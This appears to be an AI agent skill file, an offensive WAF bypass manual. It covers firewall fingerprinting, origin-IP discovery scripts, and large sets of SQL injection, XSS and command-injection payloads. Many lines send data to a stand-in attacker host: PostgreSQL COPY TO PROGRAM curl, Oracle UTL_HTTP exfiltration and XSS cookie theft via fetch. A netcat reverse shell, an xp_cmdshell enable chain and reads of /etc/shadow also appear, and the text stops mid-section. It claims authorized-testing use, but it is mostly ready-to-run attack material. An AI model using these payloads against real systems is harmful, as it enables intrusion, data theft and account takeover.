---
description: "Elite WAF bypass methodology: detection, fingerprinting, origin IP discovery, per-vendor bypass techniques, per-vuln-class payload mutation, HTTP-level evasion, encoding chains, automated bypass workflows, custom tamper scripts, 2024-2025 cutting edge techniques."
trigger: "WAF bypass, firewall evasion, payload obfuscation, WAF fingerprinting, origin IP discovery, tamper scripts, filter evasion, WAF detection, bypass Cloudflare, bypass AWS WAF, bypass ModSecurity, bypass Akamai, bypass Imperva, HTTP smuggling WAF, encoding bypass, SQLi WAF bypass, XSS WAF bypass"
---

# WAF Bypass — Elite Methodology (Level 10)

Authorized penetration testing only. Every technique here is paired with its detection signature so defenders can validate coverage.

---

## 1. WAF DETECTION & FINGERPRINTING

### 1.1 Passive Detection Signals

**Response Headers**
```
Server: cloudflare
Server: AkamaiGHost
Server: AkamaiNetStorage
X-Sucuri-ID: <id>
X-Powered-By-Plesk: <version>
X-CDN: Imperva
X-Iinfo: <fingerprint>
x-amz-cf-id: <cloudfront>
x-amz-request-id: <aws>
X-Cache: HIT from <provider>
Via: 1.1 varnish
X-Varnish: <id>
```

**Cookie Patterns**
```
__cfduid=             → Cloudflare (legacy)
cf_clearance=         → Cloudflare bot challenge
_utmz=                → Google Analytics, not WAF but useful for correlation
visid_incap_=         → Imperva Incapsula
incap_ses_=           → Imperva Incapsula
nlbi_=                → Imperva Incapsula
ak_bmsc=              → Akamai Bot Manager
bm_sv=                → Akamai Bot Manager
bm_sz=                → Akamai Bot Manager
__utm[a-z]=           → various
AWSALB=               → AWS ALB (not WAF but co-located)
```

**Error Page Fingerprints**
```
"Access Denied" + "Sucuri Website Firewall"       → Sucuri
"Request blocked" + cloudflare-nginx              → Cloudflare
"The requested URL was rejected" + F5             → F5 BIG-IP
"You don't have permission" + mod_security        → ModSecurity
"Error 16" + "This request was blocked"           → Imperva
"Request Rejected" + Barracuda                    → Barracuda
"<title>Web Application Firewall" + Fortinet      → FortiWeb
403 with empty body + X-Amzn-RequestId            → AWS WAF
"Attention Required!" + Cloudflare                → CF challenge page
"Sorry, you have been blocked"                    → Cloudflare
```

**Timing Signals**
- WAF adds 5-50ms overhead vs direct connection
- Challenge pages (JS challenges) add 3-10 seconds
- Rate limiting: response time increases after N requests
- Measure: `curl -o /dev/null -s -w "%{time_total}\n" https://target.com/`

### 1.2 Active WAF Probing Payloads

Send each payload and analyze response code, body, and headers:

```bash
# Probe 1: Classic SQLi trigger
curl -ski "https://TARGET/page?id=1' OR '1'='1" -H "User-Agent: Mozilla/5.0"

# Probe 2: XSS trigger  
curl -ski "https://TARGET/page?q=<script>alert(1)</script>"

# Probe 3: Path traversal trigger
curl -ski "https://TARGET/page?file=../../etc/passwd"

# Probe 4: Command injection trigger
curl -ski "https://TARGET/page?cmd=;cat+/etc/passwd"

# Probe 5: Benign baseline (same param, safe value)
curl -ski "https://TARGET/page?id=1"

# Compare HTTP status codes and response times
# WAF blocked = 403/406/429/503 on probes 1-4, 200 on probe 5
```

**Active Fingerprinting Probe Set**
```bash
PAYLOADS=(
  "' OR '1'='1"
  "<script>alert(1)</script>"
  "../../../etc/passwd"
  ";ls -la"
  "UNION SELECT 1,2,3--"
  "AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
  "exec(chr(120)+chr(112)+chr(95)+chr(99)+chr(109)+chr(100))"
  "${7*7}"
  "{{7*7}}"
  "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
)

for p in "${PAYLOADS[@]}"; do
  RESP=$(curl -ski "https://TARGET/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")" 2>&1)
  STATUS=$(echo "$RESP" | grep "^HTTP" | awk '{print $2}')
  echo "[$STATUS] $p"
done
```

### 1.3 Vendor Signature Reference Table

| Vendor | Header Signature | Cookie Signature | Block Page Pattern | Status Code |
|--------|-----------------|------------------|--------------------|-------------|
| Cloudflare | `Server: cloudflare` | `cf_clearance` | "Sorry, you have been blocked" | 403/503 |
| AWS WAF | `X-Amzn-RequestId` | none | "Forbidden" (empty body common) | 403 |
| Akamai | `Server: AkamaiGHost` | `ak_bmsc`, `bm_sv` | "Access Denied" with Ref# | 403 |
| Imperva | `X-Iinfo`, `X-CDN: Imperva` | `visid_incap_`, `nlbi_` | "Error 16" blocked | 403 |
| Sucuri | `X-Sucuri-ID` | none | "Sucuri Website Firewall" | 403 |
| ModSecurity | `Server: Apache` (no WAF header) | none | "406 Not Acceptable" or "403 Forbidden" w/ ModSec message | 403/406 |
| F5 BIG-IP | `Server: BigIP` or F5 cookie | `BIGipServer*` | "The requested URL was rejected" | 403 |
| Barracuda | none exposed | `barra_counter_session` | "You are not authorized" Barracuda | 403 |
| FortiWeb | `FORTIWAFSID=` | `FORTIWAFSID` | Fortinet block page | 403 |
| Radware | `X-SL-CompState` | `SlBrowserKey` | Radware block | 403 |
| Citrix NetScaler | `Via: NS-CACHE` | `NSC_*` | NetScaler block page | 403 |
| Wallarm | none exposed | none | Wallarm block (nginx) | 403 |
| StackPath | `X-SP-*` | none | StackPath block | 403 |
| Fastly | `X-Served-By`, `X-Cache` | none | Fastly error page | 403 |
| Azure Front Door | `X-Azure-Ref` | none | Azure WAF block | 403 |

### 1.4 WAF Confidence Scoring System

Score 0-100 based on signals observed:

```
+30: Block page contains known vendor string
+25: Response header matches vendor signature
+20: Cookie matches vendor pattern
+15: Block HTTP status matches expected code
+10: Timing analysis shows WAF overhead
+05: Error ID format matches vendor format
─────────────────────────────────────────
90-100: Confirmed vendor identified
70-89:  High confidence, likely identified
50-69:  Medium confidence, probable vendor
30-49:  Low confidence, WAF present, vendor unclear
0-29:   No WAF detected (probe deeper or WAF is passive)
```

### 1.5 Automated Fingerprinting One-Liners

```bash
# whatwaf (Python tool)
whatwaf -u https://TARGET --ra --pl 5

# wafw00f
wafw00f https://TARGET -a

# Manual curl fingerprint
curl -sI "https://TARGET/?id=1%27" | grep -iE "(server|x-powered|cf-|x-iinfo|x-sucuri|x-amz|x-cdn|via|x-cache)"

# Nmap WAF detection
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint TARGET

# HTTPx with probe
echo "TARGET" | httpx -status-code -server -content-type -silent -H "X-Scan: 1'OR'1'='1"

# Check Cloudflare specifically
dig +short TARGET | grep -E "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.(41|18[0-9])\.|190\.93\.|188\.114\.|197\.234\.)"
```

---

## 2. ORIGIN IP DISCOVERY (12 Methods)

### Method 1: SecurityTrails Historical DNS

```bash
# API key required — free tier available
curl -s "https://api.securitytrails.com/v1/history/TARGET.COM/dns/a" \
  -H "APIKEY: YOUR_API_KEY" | jq '.records[].values[].ip'

# Also check AAAA records
curl -s "https://api.securitytrails.com/v1/history/TARGET.COM/dns/aaaa" \
  -H "APIKEY: YOUR_API_KEY" | jq '.records[].values[].ipv6'
```

### Method 2: Certificate Transparency Logs

```bash
# crt.sh enumeration
curl -s "https://crt.sh/?q=%.TARGET.COM&output=json" | jq -r '.[].name_value' | sort -u

# Censys certificate search
# Using Censys API
curl -s "https://search.censys.io/api/v2/certificates/search" \
  -H "Authorization: Basic BASE64(API_ID:API_SECRET)" \
  -H "Content-Type: application/json" \
  -d '{"q":"parsed.names: TARGET.COM","per_page":100}' | \
  jq -r '.result.hits[].parsed.subject_dn'

# Extract IPs from cert SAN results
curl -s "https://crt.sh/?q=TARGET.COM&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | \
  while read sub; do
    ip=$(dig +short "$sub" 2>/dev/null | grep -E '^[0-9]+\.')
    [ -n "$ip" ] && echo "$sub → $ip"
  done
```

### Method 3: Shodan/Censys Favicon Hash

```bash
# Calculate favicon hash for Shodan
python3 -c "
import requests, mmh3, codecs
r = requests.get('https://TARGET.COM/favicon.ico', verify=False)
favicon = codecs.encode(r.content, 'base64')
hash = mmh3.hash(favicon)
print(f'http.favicon.hash:{hash}')
"

# Search Shodan
curl -s "https://api.shodan.io/shodan/host/search?key=SHODAN_API_KEY&query=http.favicon.hash:HASH_VALUE" | \
  jq -r '.matches[].ip_str'

# Censys equivalent
curl -s "https://search.censys.io/api/v2/hosts/search" \
  -H "Authorization: Basic BASE64" \
  -d '{"q":"services.http.response.favicon.md5_hash:HASH"}' | \
  jq -r '.result.hits[].ip'
```

### Method 4: SPF/MX Record Analysis

```bash
# SPF records often reveal origin mail servers on same IP block
dig TXT TARGET.COM | grep spf | tr ' ' '\n' | grep -E '(ip4|ip6|include|a:|mx:)'

# MX records resolve to mail servers, often same /24 as web server
dig MX TARGET.COM | awk '{print $NF}' | while read mx; do
  dig +short "$mx"
done

# Check for direct-to-IP mail delivery bypassing WAF
dig A mail.TARGET.COM
dig A smtp.TARGET.COM
dig A mx1.TARGET.COM
dig A mx2.TARGET.COM
```

### Method 5: Email Header Analysis

```bash
# Send email to contact@TARGET.COM, harvest Received headers
# Look for:
# Received: from TARGET.COM ([REAL_IP]) by...
# X-Originating-IP: REAL_IP
# Return-Path: <user@TARGET.COM>

# Parse Received headers for IPs
cat email_headers.txt | grep "^Received:" | \
  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | \
  grep -v "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)"
```

### Method 6: Subdomain Scanning for Non-CDN IPs

```bash
# Common subdomains that skip WAF
SUBS=(direct dev staging beta test api mail smtp ftp cpanel webmail admin old legacy origin backend)

for sub in "${SUBS[@]}"; do
  ip=$(dig +short "${sub}.TARGET.COM" 2>/dev/null | grep -E '^[0-9]+\.')
  if [ -n "$ip" ]; then
    # Check if IP is in known CDN range
    CF=$(echo "$ip" | grep -E "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.41\.)")
    [ -z "$CF" ] && echo "[POSSIBLE ORIGIN] ${sub}.TARGET.COM → $ip"
  fi
done

# Try direct access with Host header
curl -sk "https://ORIGIN_IP/" -H "Host: TARGET.COM" -I
```

### Method 7: Web Archive Historical IP

```bash
# Wayback Machine CDX API for historical data
curl -s "http://web.archive.org/cdx/search/cdx?url=TARGET.COM&output=json&fl=timestamp,original,statuscode&limit=100" | \
  jq -r '.[] | "\(.[0]) \(.[1])"' | head -20

# viewdns.info IP history
curl -s "https://viewdns.info/iphistory/?domain=TARGET.COM" | \
  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'

# Check archive for old DNS (requires manual inspection)
# https://web.archive.org/web/*/TARGET.COM
```

### Method 8: SSL Certificate SAN Analysis

```bash
# Extract SANs from live certificate
openssl s_client -connect TARGET.COM:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -A1 "Subject Alternative Name" | \
  tr ',' '\n' | grep "DNS:" | sed 's/.*DNS://' | tr -d ' '

# Resolve all SANs and find non-CDN IPs
openssl s_client -connect TARGET.COM:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text 2>/dev/null | \
  grep -oE 'DNS:[^,]+' | sed 's/DNS://' | \
  while read san; do
    ip=$(dig +short "$san" | tail -1)
    echo "$san → $ip"
  done
```

### Method 9: Error Page Fingerprinting

```bash
# Trigger 404 errors and analyze response for server-specific info
curl -sk "https://TARGET.COM/thiswillneverexist_$(date +%s).html" -I
curl -sk "https://TARGET.COM/thiswillneverexist_$(date +%s).php"

# Look for: Apache/nginx version, PHP version, server software
# Different server software = different IP (CDN vs origin)

# Trigger 500 error
curl -sk "https://TARGET.COM/?param[]&param[]=x" 

# Check for debug headers on errors
curl -sk "https://TARGET.COM/nonexistent" -v 2>&1 | grep -iE "(x-backend|x-origin|x-server|x-real|x-forwarded)"
```

### Method 10: Direct IP Probing with Host Header Spoofing

```bash
# Once you have a candidate IP, verify it's the origin
TARGET_IP="1.2.3.4"
TARGET_HOST="TARGET.COM"

# Test direct access bypassing WAF
curl -sk "http://${TARGET_IP}/" -H "Host: ${TARGET_HOST}" -I
curl -sk "https://${TARGET_IP}/" -H "Host: ${TARGET_HOST}" --insecure -I

# Test if WAF payloads work against direct IP
curl -sk "http://${TARGET_IP}/?id=1'OR'1'='1" -H "Host: ${TARGET_HOST}"

# Check for internal management interfaces
for port in 8080 8443 8888 9090 9443 2082 2083 2086 2087; do
  curl -sk --connect-timeout 3 "http://${TARGET_IP}:${port}/" -H "Host: ${TARGET_HOST}" -o /dev/null -w "%{http_code} port ${port}\n"
done
```

### Method 11: DNS History Services

```bash
# viewdns.info (no API key needed for basic)
curl -s "https://viewdns.info/iphistory/?domain=TARGET.COM" 2>/dev/null | \
  grep -oP '(?<=<td>)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(?=</td>)'

# dnshistory.org
curl -s "https://dnshistory.org/historical-dns-records/a/TARGET.COM" | \
  grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'

# DNSDumpster (needs session token)
curl -s "https://dnsdumpster.com" | grep -i "csrfmiddlewaretoken" | head -1

# HackerTarget DNS history
curl -s "https://api.hackertarget.com/hostsearch/?q=TARGET.COM" | \
  awk -F',' '{print $2}' | sort -u

# Rapid7 FDNS data (if access available)
# grep "TARGET.COM" fdns_a.json | jq -r '.value' | sort -u
```

### Method 12: IPv6 Origin Discovery

```bash
# IPv6 is frequently not routed through WAF
dig AAAA TARGET.COM
dig AAAA www.TARGET.COM

# Enumerate AAAA records for subdomains
for sub in www mail smtp ftp api dev staging; do
  ipv6=$(dig AAAA ${sub}.TARGET.COM +short 2>/dev/null)
  [ -n "$ipv6" ] && echo "${sub}.TARGET.COM → $ipv6"
done

# Direct probe to IPv6 origin
curl -6 -sk "https://[2606:4700::1234:5678]/" -H "Host: TARGET.COM" -I

# Check if IPv6 bypasses WAF rules
curl -6 -sk "https://[IPV6_ADDR]/?id=1'OR'1'='1" -H "Host: TARGET.COM"
```

---

## 3. SQLi WAF BYPASS

### 3.1 MySQL WAF Bypass Techniques

**Comment Variations**
```sql
-- Standard: SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3
-- WAF bypass comment styles:
SELECT/**/username/**/FROM/**/users
SELECT/*!*/username/*!*/FROM/*!*/users
SELECT/*!50000*/username/*!50000*/FROM/*!50000*/users
SELECT/*!32302*/username/*!32302*/FROM/*!32302*/users
1'/**/UNION/**/SELECT/**/1,2,3--+-
1'/*!UNION*//*!SELECT*/1,2,3--+-
1'/*!50000UNION*//*!50000SELECT*/1,2,3--+-
```

**Whitespace Substitution**
```sql
-- Replace spaces with:
%09    (tab)
%0a    (newline)
%0d    (carriage return)
%0c    (form feed)
%0b    (vertical tab)
%a0    (non-breaking space, some parsers)
()     (empty parentheses where allowed)
/**/   (inline comment)

-- Examples:
1'%09UNION%09SELECT%091,2,3--+-
1'%0aUNION%0aSELECT%0a1,2,3--+-
1'%23%0aUNION%23%0aSELECT%23%0a1,2,3%23%0a
-- (#) is comment in MySQL, %23 = #, %0a = newline ends the comment
```

**Case Variation**
```sql
uNiOn SeLeCt
UnIoN SeLeCt
UNION SELECT
union select
uNIoN sELEcT
```

**Function Equivalents**
```sql
-- SLEEP alternatives for time-based
SLEEP(5)
BENCHMARK(50000000,MD5(1))
GET_LOCK('a',5)
WAIT_FOR_EXECUTED_GTID_SET('3E11FA47-71CA-11E1-9E33-C80AA9429562:1',5)

-- CONCAT alternatives  
CONCAT(0x41,0x42)
CONCAT_WS(0x20,0x41,0x42)
MAKE_SET(7,0x41,0x42,0x43)
ELT(1,0x41)
CHAR(65)
HEX('A')

-- VERSION alternatives
@@VERSION
@@GLOBAL.VERSION  
VERSION()
```

**Scientific Notation Bypass**
```sql
-- Numeric context bypass
1E0 UNION SELECT ...
1.0e0 UNION SELECT ...
0x41 = 65
0b1000001 = 65
```

**INFORMATION_SCHEMA Alternatives**
```sql
-- When information_schema is blocked:
SELECT * FROM sys.schema_table_statistics_with_buffer;
SELECT * FROM sys.x$schema_table_statistics_with_buffer;
SELECT table_name FROM mysql.innodb_table_stats;
SELECT table_name FROM mysql.innodb_index_stats;
-- MySQL 8.0+
SELECT * FROM performance_schema.tables;
-- sys schema
SELECT * FROM sys.schema_tables;
```

**Boolean Blind Without Spaces**
```sql
1'AND(SELECT(1)FROM(SELECT(SLEEP(0)))a)AND'1'='1
1'AND(1)=(1)AND'1'='1
1'AND(SELECT(0x41))>0AND'1'='1
(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'*/
```

**Inline Version Comment Bypass**
```sql
-- Only executes on MySQL >= 5.0.0
/*!50000 SLEEP(5)*/
/*!50000 UNION*//*!50000 SELECT*//*!50000 1,2,3*/
-- Only executes on MySQL >= 4.0.0  
/*!40000 UNION SELECT 1,2,3*/
```

**Second-Order Injection**
```sql
-- Register with username:  admin'--
-- Query at login: SELECT * FROM users WHERE username='admin'--' AND password='x'
-- Results in: SELECT * FROM users WHERE username='admin'
```

**Stacked Query Bypass**
```sql
-- When multi-statement is allowed
1; INSERT INTO users VALUES('pwned','pwned')--
1; UPDATE users SET password=0x70776e6564 WHERE username='admin'--
1; DROP TABLE IF EXISTS temp_exfil; CREATE TABLE temp_exfil (data TEXT); INSERT INTO temp_exfil SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users--
```

**Full WAF Bypass Payload Chain (MySQL)**
```
id=1'/*!50000UNION*//*!50000SELECT*/1,2,GROUP_CONCAT(0x7e,username,0x3a,password,0x7e),4,5/*!50000FROM*//*!50000users*/--+-
```

### 3.2 MSSQL WAF Bypass Techniques

**Comment and Whitespace**
```sql
1'/**/UNION/**/SELECT/**/1,2,3--
1'%20UNION%20SELECT%201,2,3--
1';EXEC(0x73656c65637420404076657273696f6e)--
-- EXEC with hex-encoded string
DECLARE @q NVARCHAR(100); SET @q=N'SE'+'LECT @@version'; EXEC(@q)
```

**String Concatenation Bypass**
```sql
-- Avoid UNION detection via string concat
EXEC('SEL'+'ECT @@version')
EXEC('SEL'+'ECT * FR'+'OM users')
-- Using variables
DECLARE @s NVARCHAR(200); SET @s = 'SELECT * FROM users'; EXEC(@s)
```

**xp_cmdshell Re-enable Chain**
```sql
-- Requires sysadmin
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- With WAF bypass:
EXEC('sp_conf'+'igure ''show advanced options'',1')
EXEC('RECONFIGURE')
EXEC('sp_conf'+'igure ''xp_cmdshell'',1')
EXEC('RECONFIGURE')
EXEC('xp_cm'+'dshell ''whoami''')
```

**Time Delay Patterns**
```sql
-- Basic
'; WAITFOR DELAY '0:0:5'--
-- WAF bypass
'; WAITFOR/**/DELAY/**/'0:0:5'--
';%09WAITFOR%09DELAY%09'0:0:5'--
-- Conditional
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
```

**sp_executesql Abuse**
```sql
DECLARE @q NVARCHAR(100)='SELECT * FROM users WHERE id=1';
EXEC sp_executesql @q;
-- Parameterized for bypass
EXEC sp_executesql N'SELECT @p', N'@p NVARCHAR(MAX)', @p=N'test'
```

**Linked Server Pivoting**
```sql
SELECT * FROM OPENROWSET('SQLOLEDB','server=internal_server;uid=sa;pwd=;','SELECT * FROM master..sysdatabases')
EXEC('SELECT * FROM [internal_server].master.dbo.sysdatabases')
```

### 3.3 PostgreSQL WAF Bypass Techniques

**Dollar Quoting**
```sql
-- Instead of: SELECT 'string'
-- Use: SELECT $$string$$
-- Or: SELECT $tag$string$tag$
1'; SELECT $$ SELECT version() $$::text--
1'; DO $$DECLARE r RECORD; BEGIN RAISE NOTICE '%', (SELECT current_user); END$$--
```

**COPY TO/FROM Bypass for File Read/Write**
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)'--
'; COPY users TO '/tmp/users.txt'--
'; CREATE TABLE t(c text); COPY t FROM '/etc/passwd'--
```

**pg_read_file / pg_ls_dir**
```sql
'; SELECT pg_read_file('/etc/passwd')--
'; SELECT pg_ls_dir('/etc/')--
'; SELECT pg_read_binary_file('/etc/shadow')--
-- Large_objects for binary
'; SELECT lo_from_bytea(0, pg_read_binary_file('/etc/shadow'))--
```

**Type Casting Bypass**
```sql
1 UNION SELECT NULL::text, version()::text, NULL::text
1 UNION SELECT 1::varchar, $$test$$::varchar, 3::varchar
-- Boolean without quotes
1 AND 1::boolean
1 OR 'a'='a'::text
```

**Array Abuse**
```sql
-- Avoid comma detection
1 UNION SELECT ARRAY[1,2,3]::text
1 UNION SELECT string_agg(username, ':') FROM users
```

### 3.4 Oracle WAF Bypass Techniques

**CHR() Concatenation**
```sql
-- Instead of: SELECT 'union'
-- Use: SELECT CHR(117)||CHR(110)||CHR(105)||CHR(111)||CHR(110)
1'||CHR(32)||'UNION'||CHR(32)||'SELECT'||CHR(32)||'NULL,NULL,NULL'||CHR(32)||'FROM'||CHR(32)||'DUAL--
-- Using CONCAT
1' UNION SELECT CONCAT(CONCAT(CHR(58),username),CHR(58)) FROM all_users--
```

**UTL_HTTP Abuse (OOB Exfil)**
```sql
'; DECLARE req UTL_HTTP.REQ; res UTL_HTTP.RESP; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/'||(SELECT user FROM dual)); res := UTL_HTTP.GET_RESPONSE(req); END;--
```

**UTL_FILE**
```sql
'; DECLARE fh UTL_FILE.FILE_TYPE; BEGIN fh:=UTL_FILE.FOPEN('/tmp','out.txt','W'); UTL_FILE.PUT_LINE(fh,(SELECT user FROM dual)); UTL_FILE.FCLOSE(fh); END;--
```

**SYS.DUAL Tricks**
```sql
1 UNION SELECT NULL FROM DUAL
1 UNION SELECT NULL,NULL,NULL FROM DUAL
-- Version fingerprint
1 UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1
```

---

## 4. XSS WAF BYPASS (50+ Payloads)

### 4.1 HTML Context Tag Mutation

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Broken tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<s c r i p t>alert(1)</s c r i p t>

<!-- Unusual tags -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe onload=alert(1) src=javascript:alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
```

### 4.2 JavaScript Context Bypass

```javascript
// Breaking out of string context
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

// Template literal
`${alert(1)}`
tag`${alert(1)}`

// eval() alternatives
Function('alert(1)')()
(new Function('alert(1)'))()
setTimeout('alert(1)',0)
setInterval('alert(1)',0)
setImmediate('alert(1)')
execScript('alert(1)')
// Via location
location='javascript:alert(1)'
location.href='javascript:alert(1)'
document.location='javascript:alert(1)'
window.location='javascript:alert(1)'

// Via write
document.write('<img src=x onerror=alert(1)>')
document.writeln('<img src=x onerror=alert(1)>')

// Indirect eval
[].constructor.constructor('alert(1)')()
''.constructor.replace.call('test',/t/g,eval,'alert(1)')
```

### 4.3 Attribute Context Bypass

```html
<!-- Double-quoted attribute -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onmouseover=alert(1) x="

<!-- Single-quoted attribute -->
' onmouseover='alert(1)
' onfocus='alert(1)' autofocus='

<!-- Unquoted attribute -->
value onmouseover=alert(1)
1 onmouseover=alert(1)
```

### 4.4 SVG-Based XSS

```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover value=alert(1)>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<!-- SVG with foreignObject -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
```

### 4.5 MathML XSS

```html
<math><mtext><table><mglyph><style></table><img src=x onerror=alert(1)>
<math><mtext><![CDATA[</mtext><script>alert(1)</script>]]></math>
<math href="javascript:alert(1)">click</math>
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
```

### 4.6 AngularJS Sandbox Escapes

```javascript
// Angular 1.0.x
{{constructor.constructor('alert(1)')()}}

// Angular 1.1.x-1.2.x  
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.3.x
{{{}[{toString:[].join,valueOf:[]}.toString().split(',').join('constructor')][{toString:[].join,valueOf:[]}.toString().split(',').join('constructor')]('alert(1)')()}}

// Angular 1.4.x
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

// Angular 1.5.x
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// Angular 1.6.x (requires $eval or $parse)
{{[].pop.constructor('alert(1)')()}}
```

### 4.7 Vue.js XSS

```javascript
// Vue.js template injection
{{_c.constructor('alert(1)')()}}
{{$el.ownerDocument.defaultView.alert(1)}}
```

### 4.8 CSP Bypass Payloads

```html
<!-- JSONP endpoints -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
<script src="https://api.jquery.com/jsonp?callback=alert"></script>

<!-- Angular script gadget (requires angular.js allowed in CSP) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- base-uri injection (if base-uri not set in CSP) -->
<base href="https://attacker.com/">

<!-- Script gadgets in common libraries -->
<!-- jQuery (unsafe-eval implied) -->
$.get('https://attacker.com/?'+document.cookie)

<!-- require.js gadget -->
<script data-main="data:,alert(1)//" src="require.js"></script>
```

### 4.9 mXSS (Mutation XSS)

```html
<!-- These get mutated by innerHTML to become XSS -->
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<table><tbody><tr><td><img src='<img src=x onerror=alert(1) //'></td></tr></tbody></table>
<!-- Comment injection mXSS -->
<svg><!--</svg><img src=x onerror=alert(1)-->
```

### 4.10 Polyglot XSS Payloads

```javascript
// Works in HTML, JS string, JS variable, URL context
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Polyglot for HTML and JS attribute
'"--><svg onload='/*</p></script></style></textarea><img src=x onerror=alert()>'>

// Multi-context polyglot
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

### 4.11 Encoding-Based Filter Bypass

```html
<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt; → only in HTML context injection
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Unicode fullwidth -->
＜script＞alert(1)＜/script＞
ａｌｅｒｔ（１）

<!-- JS unicode escapes (inside JS strings) -->
\u003cscript\u003ealert(1)\u003c/script\u003e
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')

<!-- Hex encoding in JS -->
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
```

### 4.12 WAF-Specific XSS Bypasses

**Cloudflare XSS Bypass (2024)**
```html
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<details/open/ontoggle=alert`1`>
<svg><animate onbegin=alert(1) attributeName=x>
```

**AWS WAF XSS Bypass**
```html
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
<SCRIPT/SRC="https://attacker.com/xss.js"></SCRIPT>
```

**ModSecurity XSS Bypass**
```html
<!-- Against CRS rule 941xxx -->
<scr%00ipt>alert(1)</scr%00ipt>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<img src="jav&#x09;ascript:alert(1)">
```

### 4.13 Blind XSS Payloads

```html
<!-- XSShunter-style blind XSS -->
"><script src="https://attacker.xss.ht"></script>
'"><img src=x onerror=eval(atob("BASE64_OF_PAYLOAD"))>

<!-- Self-contained blind XSS (no external dependency) -->
"><svg onload="
  var i=new Image();
  i.src='https://attacker.com/?c='+encodeURIComponent(document.cookie)
    +'&u='+encodeURIComponent(document.URL)
    +'&h='+encodeURIComponent(document.referrer);
">

<!-- Via fetch -->
"><svg onload="fetch('https://attacker.com/?'+btoa(document.cookie))">
```

---

## 5. COMMAND INJECTION WAF BYPASS

### 5.1 Space Substitution

```bash
# IFS-based space bypass
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS}${IFS}/etc/passwd

# Alternate whitespace
cat%09/etc/passwd     # tab
cat%0a/etc/passwd     # newline
cat$'\x20'/etc/passwd # hex space
cat$'\t'/etc/passwd   # tab via $'...'

# No-space alternatives  
{cat,/etc/passwd}
{ls,-la,/}
{wget,http://attacker.com}
```

### 5.2 Brace Expansion

```bash
{cat,/etc/passwd}
{ls,-la,/}
{nc,-e,/bin/sh,attacker.com,4444}
{curl,-s,http://attacker.com/$(id)}
